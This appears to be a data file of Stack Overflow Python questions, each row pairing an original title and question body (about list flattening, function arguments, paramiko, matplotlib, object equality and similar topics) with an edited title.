1",Mixing files and loops
"How can I found out, how many arguments a function takes in Python?"," How can I find the number of arguments of a Python function? I need to know how many normal arguments it has and how many named arguments.Example: This method has 2 arguments and 1 named argument. <code>  def someMethod(self, arg1, kwarg1=None): pass",How can I find the number of arguments of a Python function?
Python -- Regex -- How to find string between to sets of strings," Consider the following: How would you go about taking out the sitemap line with regex in python? The following can be used to pull out the anchor tags. However, there are multiple anchor tags. Also there are multiple hotlink(s) so we can't really use them either? <code>  <div id=hotlinklist> <a href=""foo1.com"">Foo1</a> <div id=hotlink> <a href=""/"">Home</a> </div> <div id=hotlink> <a href=""/extract"">Extract</a> </div> <div id=hotlink> <a href=""/sitemap"">Sitemap</a> </div></div> <a href=""/sitemap"">Sitemap</a> '/<a(.*?)a>/i'",Python -- Regex -- How to find a string between two sets of strings
Check whether a path exists on a remote host using parakiko," Paramiko's SFTPClient apparently does not have an exists method. This is my current implementation: Is there a better way to do this? Checking for substring in Exception messages is pretty ugly and can be unreliable. <code>  def rexists(sftp, path): """"""os.path.exists for paramiko's SCP object """""" try: sftp.stat(path) except IOError, e: if 'No such file' in str(e): return False raise else: return True",Check whether a path exists on a remote host using paramiko
Can you pass a class (not an object) is a parameter to a method in python?," I want to do something like the following I want this to be equivalent to A.static_method(). Is this possible? <code>  class A: def static_method_A(): print ""hello""def main(param=A): param.static_method_A()",Can you pass a class (not an object) as a parameter to a method in python?
"""else"" considered harmful?"," In an answer (by S.Lott) to a question about Python's try...else statement: Actually, even on an if-statement, the else: can be abused in truly terrible ways creating bugs that are very hard to find. [...] Think twice about else:. It is generally a problem. Avoid it except in an if-statement and even then consider documenting the else- condition to make it explicit.Is this a widely held opinion? Is else considered harmful?Of course you can write confusing code with it but that's true of any other language construct. Even Python's for...else seems to me a very handy thing to have (less so for try...else).  <code> ","""else"" considered harmful in Python?"
How to ignore deprication warnings in Python," I keep getting this : How do I make this message go away? Is there a way to avoid warnings in Python? <code>  DeprecationWarning: integer argument expected, got float",How to ignore deprecation warnings in Python
Where to keep unit tests.," Possible Duplicate: Where do the Python unit tests go? Are unit tests kept in the same file as the code, a separate file in the same directory, or in an entirely different directory? <code> ",Where to keep Python unit tests?
Where to keep unit tests?," Possible Duplicate: Where do the Python unit tests go? Are unit tests kept in the same file as the code, a separate file in the same directory, or in an entirely different directory? <code> ",Where to keep Python unit tests?
How to find a thread id in Python," I have a multi-threading Python program, and a utility function, writeLog(message), that writes out a timestamp followed by the message. Unfortunately, the resultant log file gives no indication of which thread is generating which message. I would like writeLog() to be able to add something to the message to identify which thread is calling it. Obviously I could just make the threads pass this information in, but that would be a lot more work. Is there some thread equivalent of os.getpid() that I could use? <code> ",How to obtain a Thread id in Python?
Best way to retrieve variable values from a text file - Python," Referring on this question, I have a similar -but not the same- problem..On my way, I'll have some text file, structured like: And I need that python read the file and then create a variable named var_a with value 'home', and so on.Example: Is this possible, I mean, even keep the var type?Notice that I have the full freedom to the text file structure, I can use the format I like if the one I proposed isn't the best.EDIT: the ConfigParser can be a solution, but I don't like it so much, because in my script I'll have then to refer to the variables in the file with But what I'll love is to refer to the variable directly, as I declared it in the python script...There is a way to import the file as a python dictionary?Oh, last thing, keep in mind that I don't know exactly how many variables would I have in the text file.Edit 2: I'm very interested at stephan's JSON solution, because in that way the text file could be read simply with others languages (PHP, then via AJAX JavaScript, for example), but I fail in something while acting that solution: In what kind of issues can I fall with the JSON format?And, how can I read a JSON array in a text file, and transform it in a python dict?P.S: I don't like the solution using .py files; I'll prefer .txt, .inc, .whatever is not restrictive to one language. <code>  var_a: 'home'var_b: 'car'var_c: 15.5 #python stuff over heregetVarFromFile(filename) #this is the function that im looking forprint var_b#output: car, as stringprint var_c#output 15.5, as number. config.get(""set"", ""var_name"") #for the example, i dont load the file but create a var with the supposed file contentfile_content = ""'var_a': 4, 'var_b': 'a string'""mydict = dict(file_content)#Error: ValueError: dictionary update sequence element #0 has length 1; 2 is requiredfile_content_2 = ""{'var_a': 4, 'var_b': 'a string'}""mydict_2 = dict(json.dump(file_content_2, True))#Error:#Traceback (most recent call last):#File ""<pyshell#5>"", line 1, in <module>#mydict_2 = dict(json.dump(file_content_2, True))#File ""C:\Python26\lib\json\__init__.py"", line 181, in dump#fp.write(chunk)#AttributeError: 'bool' object has no attribute 'write'",Best way to retrieve variable values from a text file?
Best way to retrieve variable values from a text file - Python - Json," Referring on this question, I have a similar -but not the same- problem..On my way, I'll have some text file, structured like: And I need that python read the file and then create a variable named var_a with value 'home', and so on.Example: Is this possible, I mean, even keep the var type?Notice that I have the full freedom to the text file structure, I can use the format I like if the one I proposed isn't the best.EDIT: the ConfigParser can be a solution, but I don't like it so much, because in my script I'll have then to refer to the variables in the file with But what I'll love is to refer to the variable directly, as I declared it in the python script...There is a way to import the file as a python dictionary?Oh, last thing, keep in mind that I don't know exactly how many variables would I have in the text file.Edit 2: I'm very interested at stephan's JSON solution, because in that way the text file could be read simply with others languages (PHP, then via AJAX JavaScript, for example), but I fail in something while acting that solution: In what kind of issues can I fall with the JSON format?And, how can I read a JSON array in a text file, and transform it in a python dict?P.S: I don't like the solution using .py files; I'll prefer .txt, .inc, .whatever is not restrictive to one language. <code>  var_a: 'home'var_b: 'car'var_c: 15.5 #python stuff over heregetVarFromFile(filename) #this is the function that im looking forprint var_b#output: car, as stringprint var_c#output 15.5, as number. config.get(""set"", ""var_name"") #for the example, i dont load the file but create a var with the supposed file contentfile_content = ""'var_a': 4, 'var_b': 'a string'""mydict = dict(file_content)#Error: ValueError: dictionary update sequence element #0 has length 1; 2 is requiredfile_content_2 = ""{'var_a': 4, 'var_b': 'a string'}""mydict_2 = dict(json.dump(file_content_2, True))#Error:#Traceback (most recent call last):#File ""<pyshell#5>"", line 1, in <module>#mydict_2 = dict(json.dump(file_content_2, True))#File ""C:\Python26\lib\json\__init__.py"", line 181, in dump#fp.write(chunk)#AttributeError: 'bool' object has no attribute 'write'",Best way to retrieve variable values from a text file?
How to run one last function before getting killed in Python?," Is there any way to run one last command before a running Python script is stopped by being killed by some other script, keyboard interrupt etc. <code> ",Running a function before exit (Python)
Inaccurate Logarith in Python," I work daily with Python 2.4 at my company. I used the versatile logarithm function 'log' from the standard math library, and when I entered log(2**31, 2) it returned 31.000000000000004, which struck me as a bit odd.I did the same thing with other powers of 2, and it worked perfectly. I ran 'log10(2**31) / log10(2)' and I got a round 31.0I tried running the same original function in Python 3.0.1, assuming that it was fixed in a more advanced version.Why does this happen? Is it possible that there are some inaccuracies in mathematical functions in Python? <code> ",Inaccurate Logarithm in Python
Making a simple list out of list of lists in python," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
Making a flat list out of list of lists in python," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
Making a flat list out of list of lists in Python," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
How to make a flat list out of list of lists?," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
How to make a flat list out of list of lists," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
How to make a flat list out of list of lists?," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
How to make a flat list out of a list of lists?," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
How to make a flat list out of a list of lists," Is there a shortcut to make a simple list out of a list of lists in Python?I can do it in a for loop, but is there some cool ""one-liner""?I tried it with functools.reduce(): But I get this error: <code>  from functools import reducel = [[1, 2, 3], [4, 5, 6], [7], [8, 9]]reduce(lambda x, y: x.extend(y), l) Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 1, in <lambda>AttributeError: 'NoneType' object has no attribute 'extend'",How to make a flat list out of a list of lists?
Get class that defined method in Python," How can I get the class that defined a method in Python?I'd want the following example to print ""__main__.FooClass"": <code>  class FooClass: def foo_method(self): print ""foo""class BarClass(FooClass): passbar = BarClass()print get_class_that_defined_method(bar.foo_method)",Get class that defined method
Get class that defined method in Python 2.6," How can I get the class that defined a method in Python?I'd want the following example to print ""__main__.FooClass"": <code>  class FooClass: def foo_method(self): print ""foo""class BarClass(FooClass): passbar = BarClass()print get_class_that_defined_method(bar.foo_method)",Get class that defined method
Python: How do I pass a variable by reference?," The Python documentation seems unclear about whether parameters are passed by reference or value, and the following code produces the unchanged value 'Original' Is there something I can do to pass the variable by actual reference? <code>  class PassByReference: def __init__(self): self.variable = 'Original' self.change(self.variable) print(self.variable) def change(self, var): var = 'Changed'",How do I pass a variable by reference?
how to know if urllib.urlretrieve successes," urllib.urlretrieve returns silently even if the file doesn't exist on the remote http server, it just saves a html page to the named file. For example: just returns silently, even if abc.jpg doesn't exist on google.com server, the generated abc.jpg is not a valid jpg file, it's actually a html page . I guess the returned headers (a httplib.HTTPMessage instance) can be used to actually tell whether the retrieval successes or not, but I can't find any doc for httplib.HTTPMessage.Can anybody provide some information about this problem? <code>  urllib.urlretrieve('http://google.com/abc.jpg', 'abc.jpg')",How to know if urllib.urlretrieve succeeds?
Python Global Interpreter Lock (GIL) workaround on multi-core systems using taskset?," So I just finished watching this talk on the Python Global Interpreter Lock (GIL) http://blip.tv/file/2232410.The gist of it is that the GIL is a pretty good design for single core systems (Python essentially leaves the thread handling/scheduling up to the operating system). But that this can seriously backfire on multi-core systems and you end up with IO intensive threads being heavily blocked by CPU intensive threads, the expense of context switching, the ctrl-C problem[*] and so on.So since the GIL limits us to basically executing a Python program on one CPU my thought is why not accept this and simply use taskset on Linux to set the affinity of the program to a certain core/cpu on the system (especially in a situation with multiple Python apps running on a multi-core system)?So ultimately my question is this: has anyone tried using taskset on Linux with Python applications (especially when running multiple applications on a Linux system so that multiple cores can be used with one or two Python applications bound to a specific core) and if so what were the results? is it worth doing? Does it make things worse for certain workloads? I plan to do this and test it out (basically see if the program takes more or less time to run) but would love to hear from others as to your experiences.Addition: David Beazley (the guy giving the talk in the linked video) pointed out that some C/C++ extensions manually release the GIL lock and if these extensions are optimized for multi-core (i.e. scientific or numeric data analysis/etc.) then rather than getting the benefits of multi-core for number crunching the extension would be effectively crippled in that it is limited to a single core (thus potentially slowing your program down significantly). On the other hand if you aren't using extensions such as thisThe reason I am not using the multiprocessing module is that (in this case) part of the program is heavily network I/O bound (HTTP requests) so having a pool of worker threads is a GREAT way to squeeze performance out of a box since a thread fires off an HTTP request and then since it's waiting on I/O gives up the GIL and another thread can do it's thing, so that part of the program can easily run 100+ threads without hurting the CPU much and let me actually use the network bandwidth that is available. As for stackless Python/etc I'm not overly interested in rewriting the program or replacing my Python stack (availability would also be a concern). [*] Only the main thread can receive signals so if you send a ctrl-C the Python interpreter basically tries to get the main thread to run so it can handle the signal, but since it doesn't directly control which thread is run (this is left to the operating system) it basically tells the OS to keep switching threads until it eventually hits the main thread (which if you are unlucky may take a while).  <code> ",Python Global Interpreter Lock (GIL) workaround on multi-core systems using taskset on Linux?
How do you get a reference to current module object in Python?, What I'm trying to do would look like this in the command line: How can I get a reference to all the names defined in mymodule from within mymodule itself?Something like this: <code>  >>> import mymodule>>> names = dir(mymodule) # mymodule.pynames = dir(__thismodule__),How to get a reference to current module's attributes in Python
Developing with pyUno for Windowsis Python 2.6 supported?," At home, on Linux, I've experimented with pyUNO to control OpenOffice.org using Python. I've been using Python 2.6. It all seems to work nicely.Now I thought I would try one of my scripts (run a graphical diff for ODF doc) on Windows. But when I tried to run it, I got: According to udk: Python UNO Bridge and OpenOffice.org Running Python on Windows, I have to run the Python interpretter that's installed with OpenOffice.org.Q1: Is Python 2.6 available for OpenOffice.org?However, that interpreter is Python 2.3, which is getting a little old! and my script uses a feature not supported by 2.3 (subprocess module).Q2: Can pyUNO programming on Windows be done with a pyUNO add-on to the standard Python distribution, not the Python that is bundled with OpenOffice.org?In my searching so far, I haven't been able to find any indication that there is a pyUNO module available to be installed into the standard Python Windows distribution... which is a surprise because on Ubuntu Linux, UNO is supported just fine in Python just by: Another problem with this is: what if I want to make a program that uses both pyUNO and other 3rd party libraries? I can't install pyUNO into my Python installation on Windows, so am I forced to somehow install my other 3rd party libraries into OpenOffice.org's bundled Python? It makes it difficult to create larger, more full-featured programs.Am I missing something, or are we stuck with this situation for now? <code>  ImportError: No module named uno apt-get install python-uno",OpenOffice.org development with pyUno for Windowswhich Python?
Command Line Arguments In Python," I am originally a C programmer. I have seen numerous tricks and ""hacks"" to read many different arguments. What are some of the ways Python programmers can do this?RelatedWhats the best way to grab/parse command line arguments passed to a Python script?Implementing a [command] [action] [parameter] style command-line interfaces?How can I process command line arguments in Python?How do I format positional argument help using Pythons optparse? <code> ",How to read/process command line arguments?
Python - Previous and next values inside a loop," How can I iterate over a list of objects, accessing the previous, current, and next items? Like this C/C++ code, in Python? <code>  foo = somevalue;previous = next = 0;for (i=1; i<objects.length(); i++) { if (objects[i]==foo) { previous = objects[i-1]; next = objects[i+1]; }}",Loop that also accesses previous and next values
Python loop that also accesses previous and next values," How can I iterate over a list of objects, accessing the previous, current, and next items? Like this C/C++ code, in Python? <code>  foo = somevalue;previous = next = 0;for (i=1; i<objects.length(); i++) { if (objects[i]==foo) { previous = objects[i-1]; next = objects[i+1]; }}",Loop that also accesses previous and next values
Custom authentication in google app engine (python)," Does anyone know or know of somewhere I can learn how to create a custom authentication process using Python and Google App Engine?I don't want to use Google accounts for authentication and want to be able to create my own users.If not specifically for Google App Engine, any resource on how to implement authentication using Python and Django? <code> ",Custom authentication in Google App Engine
Custom authentication in Google App Engine (Python)," Does anyone know or know of somewhere I can learn how to create a custom authentication process using Python and Google App Engine?I don't want to use Google accounts for authentication and want to be able to create my own users.If not specifically for Google App Engine, any resource on how to implement authentication using Python and Django? <code> ",Custom authentication in Google App Engine
Python: Finding Keys with Unique Values in a Dictionary?," I receive a dictionary as input, and want to return a list of keys for which the dictionary values are unique in the scope of that dictionary.I will clarify with an example. Say my input is dictionary a, constructed as follows: The result I expect is ['dog', 'snake'].There are obvious brute force ways to achieve this, however I wondered if there's a neat Pythonian way to get the job done. <code>  a = dict()a['cat'] = 1a['fish'] = 1a['dog'] = 2 # <-- uniquea['bat'] = 3a['aardvark'] = 3a['snake'] = 4 # <-- uniquea['wallaby'] = 5a['badger'] = 5 ",Python: finding keys with unique values in a dictionary?
"Overriding ""+="" in Python", Is it possible to override += in Python? <code> ,"Overriding ""+="" in Python? (__iadd__() method)"
group by  & count funtion in sqlalchemy," I want a ""group by and count"" command in sqlalchemy. How can I do this? <code> ",Group by & count function in sqlalchemy
Python unittest: callable object that returns a test suite," I'm learning Python and have been trying to understand more about the details of Python's unittest module. The documentation includes the following: For the ease of running tests, as we will see later, it is a good idea to provide in each test module a callable object that returns a pre-built test suite: As far as I can tell, the purpose of doing this is not explained. In addition, I was unable to figure out how one would use such a method. I tried several things without success (aside from learning about the error messages I got): The following ""worked"" but seems awkward and it required that I change the method signature of suite() to 'def suite(self):'. <code>  def suite(): suite = unittest.TestSuite() suite.addTest(WidgetTestCase('testDefaultSize')) suite.addTest(WidgetTestCase('testResize')) return suite import unittestdef average(values): return sum(values) / len(values)class MyTestCase(unittest.TestCase): def testFoo(self): self.assertEqual(average([10,100]),55) def testBar(self): self.assertEqual(average([11]),11) def testBaz(self): self.assertEqual(average([20,20]),20) def suite(): suite = unittest.TestSuite() suite.addTest(MyTestCase('testFoo')) suite.addTest(MyTestCase('testBar')) suite.addTest(MyTestCase('testBaz')) return suiteif __name__ == '__main__': # s = MyTestCase.suite() # TypeError: unbound method suite() must be called # with MyTestCase instance as first argument # s = MyTestCase.suite(MyTestCase()) # ValueError: no such test method in <class '__main__.MyTestCase'>: runTest # s = MyTestCase.suite(MyTestCase('testFoo')) # TypeError: suite() takes no arguments (1 given) s = MyTestCase('testFoo').suite()unittest.TextTestRunner().run(s)","With Python unittest, how do I create and use a ""callable object that returns a test suite""?"
Using Python to replace Matlab : how to import data?," I want to use some Python libraries to replace MATLAB. How could I import Excel data in Python (for example using NumPy) to use them?I don't know if Python is a credible alternative to MATLAB, but I want to try it. Is there a a tutorial? <code> ",Using Python to replace MATLAB: how to import data?
python NotImplemented constant," Looking through decimal.py, it uses NotImplemented in many special methods. e.g. The Python docs say: NotImplemented Special value which can be returned by the rich comparison special methods (__eq__(), __lt__(), and friends), to indicate that the comparison is not implemented with respect to the other type.It doesn't talk about other special methods and neither does it describe the behavior.It seems to be a magic object which if returned from other special methods raises TypeError, and in rich comparison special methods does nothing.e.g. prints True, but raises TypeError, so I am curious as to what's going on and what is the usage/behavior of NotImplemented. <code>  class A(object): def __lt__(self, a): return NotImplemented def __add__(self, a): return NotImplemented print A() < A() print A() + 1",Python NotImplemented constant
Python extract domain name from URL," how would you extract the domain name from a URL, excluding any subdomains?My initial simplistic attempt was: This works for http://www.foo.com, but not http://www.foo.com.au.Is there a way to do this properly without using special knowledge about valid TLDs (Top Level Domains) or country codes (because they change).thanks <code>  '.'.join(urlparse.urlparse(url).netloc.split('.')[-2:])",How to extract top-level domain name (TLD) from URL
how to extract domain name from URL," how would you extract the domain name from a URL, excluding any subdomains?My initial simplistic attempt was: This works for http://www.foo.com, but not http://www.foo.com.au.Is there a way to do this properly without using special knowledge about valid TLDs (Top Level Domains) or country codes (because they change).thanks <code>  '.'.join(urlparse.urlparse(url).netloc.split('.')[-2:])",How to extract top-level domain name (TLD) from URL
perl to python?," I found this Perl script while migrating my SQLite database to mysqlI was wondering (since I don't know Perl) how could one rewrite this in Python?Bonus points for the shortest (code) answer :)edit: sorry I meant shortest code, not strictly shortest answer Some additional code was necessary to successfully migrate the sqlite database (handles one line Create table statements, foreign keys, fixes a bug in the original program that converted empty fields '' to \'. I posted the code on the migrating my SQLite database to mysql Question <code>  #! /usr/bin/perlwhile ($line = <>){ if (($line !~ /BEGIN TRANSACTION/) && ($line !~ /COMMIT/) && ($line !~ /sqlite_sequence/) && ($line !~ /CREATE UNIQUE INDEX/)){ if ($line =~ /CREATE TABLE \""([a-z_]*)\""(.*)/){ $name = $1; $sub = $2; $sub =~ s/\""//g; #"" $line = ""DROP TABLE IF EXISTS $name;\nCREATE TABLE IF NOT EXISTS $name$sub\n""; } elsif ($line =~ /INSERT INTO \""([a-z_]*)\""(.*)/){ $line = ""INSERT INTO $1$2\n""; $line =~ s/\""/\\\""/g; #"" $line =~ s/\""/\'/g; #"" }else{ $line =~ s/\'\'/\\\'/g; #' } $line =~ s/([^\\'])\'t\'(.)/$1THIS_IS_TRUE$2/g; #' $line =~ s/THIS_IS_TRUE/1/g; $line =~ s/([^\\'])\'f\'(.)/$1THIS_IS_FALSE$2/g; #' $line =~ s/THIS_IS_FALSE/0/g; $line =~ s/AUTOINCREMENT/AUTO_INCREMENT/g; print $line; }}",Translating Perl to Python
Perl to Python?," I found this Perl script while migrating my SQLite database to mysqlI was wondering (since I don't know Perl) how could one rewrite this in Python?Bonus points for the shortest (code) answer :)edit: sorry I meant shortest code, not strictly shortest answer Some additional code was necessary to successfully migrate the sqlite database (handles one line Create table statements, foreign keys, fixes a bug in the original program that converted empty fields '' to \'. I posted the code on the migrating my SQLite database to mysql Question <code>  #! /usr/bin/perlwhile ($line = <>){ if (($line !~ /BEGIN TRANSACTION/) && ($line !~ /COMMIT/) && ($line !~ /sqlite_sequence/) && ($line !~ /CREATE UNIQUE INDEX/)){ if ($line =~ /CREATE TABLE \""([a-z_]*)\""(.*)/){ $name = $1; $sub = $2; $sub =~ s/\""//g; #"" $line = ""DROP TABLE IF EXISTS $name;\nCREATE TABLE IF NOT EXISTS $name$sub\n""; } elsif ($line =~ /INSERT INTO \""([a-z_]*)\""(.*)/){ $line = ""INSERT INTO $1$2\n""; $line =~ s/\""/\\\""/g; #"" $line =~ s/\""/\'/g; #"" }else{ $line =~ s/\'\'/\\\'/g; #' } $line =~ s/([^\\'])\'t\'(.)/$1THIS_IS_TRUE$2/g; #' $line =~ s/THIS_IS_TRUE/1/g; $line =~ s/([^\\'])\'f\'(.)/$1THIS_IS_FALSE$2/g; #' $line =~ s/THIS_IS_FALSE/0/g; $line =~ s/AUTOINCREMENT/AUTO_INCREMENT/g; print $line; }}",Translating Perl to Python
Can you translate this Perl program to Python for me?," I found this Perl script while migrating my SQLite database to mysqlI was wondering (since I don't know Perl) how could one rewrite this in Python?Bonus points for the shortest (code) answer :)edit: sorry I meant shortest code, not strictly shortest answer Some additional code was necessary to successfully migrate the sqlite database (handles one line Create table statements, foreign keys, fixes a bug in the original program that converted empty fields '' to \'. I posted the code on the migrating my SQLite database to mysql Question <code>  #! /usr/bin/perlwhile ($line = <>){ if (($line !~ /BEGIN TRANSACTION/) && ($line !~ /COMMIT/) && ($line !~ /sqlite_sequence/) && ($line !~ /CREATE UNIQUE INDEX/)){ if ($line =~ /CREATE TABLE \""([a-z_]*)\""(.*)/){ $name = $1; $sub = $2; $sub =~ s/\""//g; #"" $line = ""DROP TABLE IF EXISTS $name;\nCREATE TABLE IF NOT EXISTS $name$sub\n""; } elsif ($line =~ /INSERT INTO \""([a-z_]*)\""(.*)/){ $line = ""INSERT INTO $1$2\n""; $line =~ s/\""/\\\""/g; #"" $line =~ s/\""/\'/g; #"" }else{ $line =~ s/\'\'/\\\'/g; #' } $line =~ s/([^\\'])\'t\'(.)/$1THIS_IS_TRUE$2/g; #' $line =~ s/THIS_IS_TRUE/1/g; $line =~ s/([^\\'])\'f\'(.)/$1THIS_IS_FALSE$2/g; #' $line =~ s/THIS_IS_FALSE/0/g; $line =~ s/AUTOINCREMENT/AUTO_INCREMENT/g; print $line; }}",Translating Perl to Python
How do I sort alphabetically in Python?," Python sorts by byte value by default, which means comes after z and other equally funny things. What is the best way to sort alphabetically in Python?Is there a library for this? I couldn't find anything. Preferrably sorting should have language support so it understands that should be sorted after z in Swedish, but that should be sorted by u, etc. Unicode support is thereby pretty much a requirement.If there is no library for it, what is the best way to do this? Just make a mapping from letter to a integer value and map the string to a integer list with that? <code> ",How do I sort unicode strings alphabetically in Python?
Returning MatPotLib image as string," I am using matplotlib in a django app and would like to directly return the rendered image.So far I can go plt.savefig(...), then return the location of the image.What I want to do is: Any ideas? <code>  return HttpResponse(plt.renderfig(...), mimetype=""image/png"")",Returning Matplotlib image as string
Returning MatPlotLib image as string," I am using matplotlib in a django app and would like to directly return the rendered image.So far I can go plt.savefig(...), then return the location of the image.What I want to do is: Any ideas? <code>  return HttpResponse(plt.renderfig(...), mimetype=""image/png"")",Returning Matplotlib image as string
How do I print a Python datetime in the local timezone?," Let's say I have a variable t that's set to this: If I say str(t), i get: How can I get a similar string, except printed in the local timezone rather than UTC? <code>  datetime.datetime(2009, 7, 10, 18, 44, 59, 193982, tzinfo=<UTC>) '2009-07-10 18:44:59.193982+00:00'",How do I print a datetime in the local timezone?
Django Inheritance And Foreign Keys," Basically, I have a model where I've created a superclass that many other classes share, and then each of those classes has some unique features that differ from each other. Let's say class A is the superclass, and class B, C, and D are children of that class.Both class B and class C can have multiples of class D, however I've seen that it's best to put the foreign key relationship in class D, which then refers to its parent class. Now in other languages, I could simply say it has a ForeignKey relationship to class A, and then the language recognizes the classes' true type. However, I don't think that's how it works with Python.What's the best recommended way of pursuing this issue?EDIT: Here is roughly what I mean... Essentially, class B and class C both have multiple class D's. But a particular class D only belongs to one of them. <code>  class A(models.Model): field = models.TextField()class B(A): other = <class specific functionality>class C(A): other2 = <different functionality>class D(A): #I would like class D to have a foreign key to either B or C, but not both.",Django Model Inheritance And Foreign Keys
Intregate Python And C++," I'm learning C++ because it's a very flexible language. But for internet things like Twitter, Facebook, Delicious and others, Python seems a much better solution.Is it possible to integrate C++ and Python in the same project? <code> ",Integrate Python And C++
python - Importing a file that is a symbolic link , If I have files x.py and y.py . And y.py is the link(symbolic or hard) of x.py .If I import both the modules in my script. Will it import it once or it assumes both are different files and import it twice.What it does exactly? <code> ,python - Importing a file that is a symbolic link
Cost of Scaling Rails vs Cost of Scaling PHP vs Python frameworks," I guess this question has been asked a lot around. I know Rails can scale because I have worked on it and it's awesome. And there is not much doubt about that as far as PHP frameworks are concerned.I don't want to know which frameworks are better.How much is difference in cost of scaling Rails vs other frameworks (PHP, Python) assuming a large app with 1 million visits per month?This is something I get asked a lot. I can explain to people that ""Rails does scale pretty well"" but in the long run, what are the economics?If somebody can provide some metrics, that'd be great. <code> ",Cost of scaling Rails vs cost of scaling PHP vs Python frameworks
(python) Boolean evaluation in a lambda," Just tooling around for my own amusement, and I want to use a lambda, because I feel like it. Can I replace this function with a lambda? Elementary, yes. But I'm interested to know... <code>  def isodd(number): if (number%2 == 0): return False else: return True",Boolean evaluation in a lambda
How to trim whitespace (including tabs)?, Is there a Python function that will trim whitespace (spaces and tabs) from a string?Example: \t example string\t example string <code> ,How do I trim whitespace?
How do I trim whitespace with Python?, Is there a Python function that will trim whitespace (spaces and tabs) from a string?Example: \t example string\t example string <code> ,How do I trim whitespace?
What is the best way to call a python script from another python script?," I have a script named test1.py which is not in a module. It just has code that should execute when the script itself is run. There are no functions, classes, methods, etc. I have another script which runs as a service. I want to call test1.py from the script running as a service.For example:File test1.py: File service.py: I'm aware of one method which is opening the file, reading the contents, and basically evaluating it. I'm assuming there's a better way of doing this. Or at least I hope so. <code>  print ""I am a test""print ""see! I do nothing productive."" # Lots of stuff heretest1.py # do whatever is in test1.py",What is the best way to call a script from another script?
What is the best way to call a Python script from another Python script?," I have a script named test1.py which is not in a module. It just has code that should execute when the script itself is run. There are no functions, classes, methods, etc. I have another script which runs as a service. I want to call test1.py from the script running as a service.For example:File test1.py: File service.py: I'm aware of one method which is opening the file, reading the contents, and basically evaluating it. I'm assuming there's a better way of doing this. Or at least I hope so. <code>  print ""I am a test""print ""see! I do nothing productive."" # Lots of stuff heretest1.py # do whatever is in test1.py",What is the best way to call a script from another script?
Is there a standard pythonic way to treat phytical units / quantities in python?," Is there a standard pythonic way to treat physical units / quantities in python? I saw different module-specific solutions from different fields like physics or neuroscience. But I would rather like to use a standard method than ""island""-solutions as others should be able to easily read my code. <code> ",Is there a standard pythonic way to treat physical units / quantities in python?
How to compare object instances in Python," I have a class MyClass, which contains two member variables foo and bar: I have two instances of this class, each of which has identical values for foo and bar: However, when I compare them for equality, Python returns False: How can I make python consider these two objects equal? <code>  class MyClass: def __init__(self, foo, bar): self.foo = foo self.bar = bar x = MyClass('foo', 'bar')y = MyClass('foo', 'bar') >>> x == yFalse",Compare object instances for equality by their attributes
Compare object instances for equality by their attributes in Python," I have a class MyClass, which contains two member variables foo and bar: I have two instances of this class, each of which has identical values for foo and bar: However, when I compare them for equality, Python returns False: How can I make python consider these two objects equal? <code>  class MyClass: def __init__(self, foo, bar): self.foo = foo self.bar = bar x = MyClass('foo', 'bar')y = MyClass('foo', 'bar') >>> x == yFalse",Compare object instances for equality by their attributes
Remove dictionary from list," If I have a list of dictionaries, say: and I would like to remove the dictionary with id of 2 (or name 'john'), what is the most efficient way to go about this programmatically (that is to say, I don't know the index of the entry in the list so it can't simply be popped). <code>  [{'id': 1, 'name': 'paul'}, {'id': 2, 'name': 'john'}]",Remove dictionary from list
